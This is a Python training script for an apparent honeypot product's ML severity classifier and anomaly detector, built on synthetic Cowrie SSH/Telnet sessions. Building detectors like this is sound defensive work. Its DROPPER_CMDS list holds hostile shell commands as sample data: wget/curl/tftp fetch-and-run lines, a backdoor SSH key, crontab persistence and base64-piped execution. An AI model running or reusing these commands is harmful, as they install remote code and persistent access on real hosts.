"""
Reproducible ML training & evaluation.

Usage:  python -m app.ml.trainer [--sessions 1500] [--seed 42] [--csv labelled.csv]

DATASET
  Default: a clearly labelled SYNTHETIC dataset produced by `build_synthetic_dataset`.
  Sessions are drawn from scenarios (benign_scan, benign_admin, benign_mistype, bruteforce,
  recon, dropper). Each event gets a severity label from a documented labelling policy based
  on its scenario (session-level ground truth not visible to the per-event features), plus
  3% random label noise, and benign/malicious command vocabularies deliberately overlap.
  => Reported metrics measure how well the model reproduces this synthetic policy. They are
     NOT evidence of real-world detection performance.
  Optional: --csv with columns eventid,protocol,dst_port,username,password,command,duration,
  session_id,label (label in low/medium/high/critical) for analyst-labelled real data.

SPLITS (no leakage)
  StratifiedGroupKFold grouped by session_id: events of one session never appear in two
  splits. 60% train / 20% validation (model selection) / 20% held-out test (reported once).

MODELS
  * RandomForestClassifier (class_weight="balanced" for imbalance), max_depth chosen on the
    validation split by macro-F1.
  * IsolationForest (unsupervised, no labels used for fitting) evaluated on the test split
    against the binary label malicious = {high, critical}.
"""
import argparse
import datetime
import json
import os
import random
import uuid
from typing import Dict, List, Optional

import joblib
import numpy as np
import pandas as pd
import sklearn
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.metrics import (accuracy_score, classification_report, confusion_matrix, f1_score,
                             precision_recall_fscore_support)
from sklearn.model_selection import StratifiedGroupKFold

from app.ml.features import FEATURE_COLUMNS, FEATURE_DOCS, featurize

SAVED_MODELS_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "saved_models"))
CLASSES = ["low", "medium", "high", "critical"]
MALICIOUS = {"high", "critical"}

# Synthetic vocabularies (benign and malicious deliberately overlap, e.g. "uname -a")
BENIGN_CMDS = ["ls -la", "cd /var/log", "df -h", "uptime", "uname -a", "cat /etc/os-release", "free -m",
               "tail -n 50 syslog", "top -b -n 1", "sudo apt update", "systemctl status nginx", "whoami"]
RECON_CMDS = ["uname -a", "whoami", "id", "cat /proc/cpuinfo", "cat /etc/passwd", "ps aux", "nproc", "w",
              "ifconfig", "netstat -tulpn", "lscpu", "hostname"]
DROPPER_CMDS = ["wget http://203.0.113.9/bins.sh -O /tmp/b.sh; chmod +x /tmp/b.sh; sh /tmp/b.sh",
                "curl -s http://198.51.100.3/x | bash", "cd /tmp && tftp -g -r mips 203.0.113.9 && chmod 777 mips && ./mips",
                "echo 'ssh-rsa AAAAB3Nza...' >> ~/.ssh/authorized_keys", "echo ZWNobyBoaQ== | base64 -d | sh",
                "(crontab -l; echo '* * * * * /tmp/.x') | crontab -", "busybox wget http://203.0.113.50/a.arm7"]
USERS = ["root", "admin", "ubuntu", "pi", "oracle", "test", "user", "deploy", "postgres", "support"]
PASSWORDS = ["123456", "admin", "password", "root", "raspberry", "12345678", "qwerty", "toor", "P@ssw0rd!", "letmein"]


def _ev(sess, eid, proto, **kw):
    d = {"session_id": sess, "eventid": eid, "protocol": proto, "dst_port": 22 if proto == "SSH" else 23}
    d.update(kw)
    return d


def build_synthetic_dataset(n_sessions: int = 1500, seed: int = 42) -> pd.DataFrame:
    rng = random.Random(seed)
    scenarios = ["benign_scan", "benign_admin", "benign_mistype", "bruteforce", "recon", "dropper"]
    weights = [0.20, 0.12, 0.08, 0.30, 0.18, 0.12]
    rows: List[dict] = []
    for _ in range(n_sessions):
        sc = rng.choices(scenarios, weights)[0]
        sess = uuid.UUID(int=rng.getrandbits(128)).hex[:12]
        proto = "Telnet" if rng.random() < (0.35 if sc in ("bruteforce", "dropper") else 0.1) else "SSH"
        evs = [(_ev(sess, "cowrie.session.connect", proto), "low")]
        if sc == "benign_scan":
            pass
        elif sc == "benign_mistype":
            u = rng.choice(["deploy", "ubuntu", "user"])
            evs += [(_ev(sess, "cowrie.login.failed", proto, username=u, password=rng.choice(PASSWORDS)), "low")
                    for _ in range(rng.randint(1, 2))]
            evs.append((_ev(sess, "cowrie.login.success", proto, username=u, password="Corr3ct-Horse!"), "low"))
        elif sc == "benign_admin":
            u = rng.choice(["deploy", "ubuntu", "admin"])
            evs.append((_ev(sess, "cowrie.login.success", proto, username=u, password="Adm1n-Strong#"), "low"))
            evs += [(_ev(sess, "cowrie.command.input", proto, command=c), "low") for c in rng.sample(BENIGN_CMDS, rng.randint(1, 5))]
        else:
            for _ in range(rng.randint(2, 15)):
                evs.append((_ev(sess, "cowrie.login.failed", proto, username=rng.choice(USERS),
                                password=rng.choice(PASSWORDS)), "medium"))
            if sc in ("recon", "dropper"):
                evs.append((_ev(sess, "cowrie.login.success", proto, username=rng.choice(["root", "admin", "pi"]),
                                password=rng.choice(PASSWORDS)), "high"))
                evs += [(_ev(sess, "cowrie.command.input", proto, command=c), "high")
                        for c in rng.sample(RECON_CMDS, rng.randint(1, 4))]
            if sc == "dropper":
                for c in rng.sample(DROPPER_CMDS, rng.randint(1, 3)):
                    evs.append((_ev(sess, "cowrie.command.input", proto, command=c), "critical"))
                    if "wget" in c or "curl" in c or "tftp" in c:
                        evs.append((_ev(sess, "cowrie.session.file_download", proto,
                                        url="http://203.0.113.9/x", file_hash=uuid.UUID(int=rng.getrandbits(128)).hex), "critical"))
        dur = round(rng.uniform(0.5, 8) if sc == "benign_scan" else rng.uniform(5, 300), 1)
        evs.append((_ev(sess, "cowrie.session.closed", proto, duration=dur), "low"))
        for ev, label in evs:
            if rng.random() < 0.03:  # label noise
                label = rng.choice([c for c in CLASSES if c != label])
            rows.append(dict(ev, label=label, scenario=sc))
    return pd.DataFrame(rows)


def load_csv_dataset(path: str) -> pd.DataFrame:
    df = pd.read_csv(path)
    missing = {"eventid", "label", "session_id"} - set(df.columns)
    if missing:
        raise ValueError(f"CSV missing columns: {sorted(missing)}")
    df = df[df["label"].isin(CLASSES)].copy()
    return df


def _features(df: pd.DataFrame) -> pd.DataFrame:
    recs = df.to_dict("records")
    return pd.DataFrame([featurize(r) for r in recs])[FEATURE_COLUMNS]


def _split(y, groups, seed):
    outer = StratifiedGroupKFold(n_splits=5, shuffle=True, random_state=seed)
    rest_idx, test_idx = next(outer.split(np.zeros(len(y)), y, groups))
    inner = StratifiedGroupKFold(n_splits=4, shuffle=True, random_state=seed)
    tr, va = next(inner.split(np.zeros(len(rest_idx)), y[rest_idx], groups[rest_idx]))
    return rest_idx[tr], rest_idx[va], test_idx


def _per_class(y_true, y_pred, labels) -> Dict:
    p, r, f, s = precision_recall_fscore_support(y_true, y_pred, labels=labels, zero_division=0)
    cm = confusion_matrix(y_true, y_pred, labels=labels)
    out = {}
    total = cm.sum()
    for i, lab in enumerate(labels):
        fp = cm[:, i].sum() - cm[i, i]
        tn = total - cm[i, :].sum() - cm[:, i].sum() + cm[i, i]
        out[lab] = {"precision": round(float(p[i]), 4), "recall": round(float(r[i]), 4), "f1": round(float(f[i]), 4),
                    "support": int(s[i]), "false_positive_rate": round(float(fp / (fp + tn)) if (fp + tn) else 0.0, 4)}
    return out


def train_models(db=None, n_sessions: int = 1500, seed: int = 42, csv_path: Optional[str] = None,
                 output_dir: Optional[str] = None, **_ignored) -> Dict:
    """Trains and evaluates both models; `db` is accepted for backward compatibility but unused."""
    out_dir = output_dir or SAVED_MODELS_DIR
    if csv_path:
        df = load_csv_dataset(csv_path)
        dataset = {"source": "csv", "path": os.path.basename(csv_path), "synthetic": False}
    else:
        df = build_synthetic_dataset(n_sessions, seed)
        dataset = {"source": "synthetic", "synthetic": True, "sessions": n_sessions, "seed": seed,
                   "description": "Synthetic labelled honeypot sessions (see app/ml/trainer.py docstring). "
                                  "Metrics are limited to this synthetic dataset."}
    if len(df) < 50 or df["label"].nunique() < 2:
        return {"success": False, "error": f"Insufficient labelled data ({len(df)} rows, {df['label'].nunique()} classes)"}

    X = _features(df)
    y = df["label"].to_numpy()
    groups = df["session_id"].astype(str).to_numpy()
    tr, va, te = _split(y, groups, seed)
    assert not (set(groups[tr]) & set(groups[te])) and not (set(groups[va]) & set(groups[te])), "session leakage"
    labels = [c for c in CLASSES if c in set(y)]

    # Model selection on validation split
    best = None
    for depth in (4, 8, 12, None):
        clf = RandomForestClassifier(n_estimators=150, max_depth=depth, min_samples_leaf=2, class_weight="balanced",
                                     random_state=seed, n_jobs=-1)
        clf.fit(X.iloc[tr], y[tr])
        score = f1_score(y[va], clf.predict(X.iloc[va]), average="macro", zero_division=0)
        if best is None or score > best[0]:
            best = (score, depth, clf)
    val_f1, best_depth, clf = best

    # Held-out test evaluation (computed from real predictions)
    y_pred = clf.predict(X.iloc[te])
    y_test = y[te]
    p_m, r_m, f_m, _ = precision_recall_fscore_support(y_test, y_pred, average="macro", zero_division=0)
    p_w, r_w, f_w, _ = precision_recall_fscore_support(y_test, y_pred, average="weighted", zero_division=0)
    majority = pd.Series(y[tr]).value_counts().idxmax()
    baseline_acc = float((y_test == majority).mean())

    # Unsupervised anomaly detector: fit WITHOUT labels on train features
    iso = IsolationForest(n_estimators=200, contamination="auto", random_state=seed)
    iso.fit(X.iloc[tr])
    iso_flag = iso.predict(X.iloc[te]) == -1
    y_bin = np.isin(y_test, list(MALICIOUS))
    tp = int((iso_flag & y_bin).sum()); fp = int((iso_flag & ~y_bin).sum())
    fn = int((~iso_flag & y_bin).sum()); tn = int((~iso_flag & ~y_bin).sum())

    version = "rf-" + datetime.datetime.utcnow().strftime("%Y%m%d%H%M%S")
    importances = dict(sorted(((c, round(float(v), 4)) for c, v in zip(FEATURE_COLUMNS, clf.feature_importances_)),
                              key=lambda kv: -kv[1]))
    metrics = {
        "status": "TRAINED",
        "model_version": version,
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "sklearn_version": sklearn.__version__,
        "dataset": dataset,
        "total_samples": int(len(df)),
        "train_samples": int(len(tr)),
        "validation_samples": int(len(va)),
        "test_samples": int(len(te)),
        "split_method": "StratifiedGroupKFold by session_id (60/20/20), no session spans two splits",
        "classes_distribution": {k: int(v) for k, v in pd.Series(y).value_counts().items()},
        "test_class_distribution": {k: int(v) for k, v in pd.Series(y_test).value_counts().items()},
        "model_selection": {"param": "max_depth", "chosen": best_depth, "validation_macro_f1": round(float(val_f1), 4)},
        # Measured on the held-out test split:
        "accuracy": round(float(accuracy_score(y_test, y_pred)), 4),
        "precision": round(float(p_m), 4),
        "recall": round(float(r_m), 4),
        "f1_score": round(float(f_m), 4),
        "weighted": {"precision": round(float(p_w), 4), "recall": round(float(r_w), 4), "f1": round(float(f_w), 4)},
        "majority_class_baseline_accuracy": round(baseline_acc, 4),
        "per_class": _per_class(y_test, y_pred, labels),
        "confusion_matrix": {"labels": labels, "matrix": confusion_matrix(y_test, y_pred, labels=labels).tolist()},
        "classification_report": classification_report(y_test, y_pred, labels=labels, zero_division=0, output_dict=True),
        "anomaly_detector": {
            "algorithm": "IsolationForest(contamination='auto'), fit without labels",
            "evaluated_against": "malicious = label in {high, critical} on held-out test split",
            "flagged_test": int(iso_flag.sum()),
            "true_positives": tp, "false_positives": fp, "false_negatives": fn, "true_negatives": tn,
            "precision": round(tp / (tp + fp), 4) if (tp + fp) else 0.0,
            "recall": round(tp / (tp + fn), 4) if (tp + fn) else 0.0,
            "false_positive_rate": round(fp / (fp + tn), 4) if (fp + tn) else 0.0,
        },
        "anomaly_detected_count": int(iso_flag.sum()),
        "anomaly_percentage": round(100.0 * float(iso_flag.mean()), 2),
        "feature_columns": FEATURE_COLUMNS,
        "feature_engineering": FEATURE_DOCS,
        "feature_importances": importances,
        "limitations": [
            "Trained and evaluated on synthetic data unless a labelled CSV is supplied." if dataset["synthetic"]
            else "Evaluated on the supplied labelled CSV only.",
            "Per-event classifier; it does not predict future attacks (no temporal forecasting task is evaluated).",
            "ML output is supporting context only - it never creates or confirms an alert on its own.",
        ],
        "saved_artifacts": {"classifier": "severity_classifier.joblib", "anomaly_detector": "anomaly_detector.joblib"},
    }
    os.makedirs(out_dir, exist_ok=True)
    joblib.dump({"model": clf, "version": version, "features": FEATURE_COLUMNS}, os.path.join(out_dir, "severity_classifier.joblib"))
    joblib.dump({"model": iso, "version": version, "features": FEATURE_COLUMNS}, os.path.join(out_dir, "anomaly_detector.joblib"))
    with open(os.path.join(out_dir, "metrics.json"), "w", encoding="utf-8") as f:
        json.dump(metrics, f, indent=2)
    try:
        from app.ml import predictor
        predictor.reset_cache()
    except Exception:
        pass
    return {"success": True, "metrics": metrics}


def get_latest_metrics():
    metrics_path = os.path.join(SAVED_MODELS_DIR, "metrics.json")
    if os.path.exists(metrics_path):
        try:
            with open(metrics_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            if "model_version" not in data:
                return {"status": "INVALID", "message": "Stored metrics predate the validated training pipeline; retrain the models."}
            return data
        except (OSError, ValueError):
            return {"status": "ERROR", "message": "metrics.json is unreadable; retrain the models."}
    return {"status": "UNTRAINED", "message": "No trained models found. Run `python -m app.ml.trainer` or POST /api/v1/ml/train."}


def main():
    ap = argparse.ArgumentParser(description="Train and evaluate CYVANTIS ML models")
    ap.add_argument("--sessions", type=int, default=1500)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--csv", default=None, help="labelled CSV instead of the synthetic dataset")
    ap.add_argument("--output-dir", default=None)
    a = ap.parse_args()
    res = train_models(n_sessions=a.sessions, seed=a.seed, csv_path=a.csv, output_dir=a.output_dir)
    if not res["success"]:
        raise SystemExit(res["error"])
    m = res["metrics"]
    print(f"model {m['model_version']} | dataset={m['dataset']['source']} | test n={m['test_samples']}")
    print(f"accuracy={m['accuracy']} macroP={m['precision']} macroR={m['recall']} macroF1={m['f1_score']} "
          f"(majority baseline acc={m['majority_class_baseline_accuracy']})")
    print("confusion matrix", m["confusion_matrix"])
    print("anomaly detector", m["anomaly_detector"])


if __name__ == "__main__":
    main()
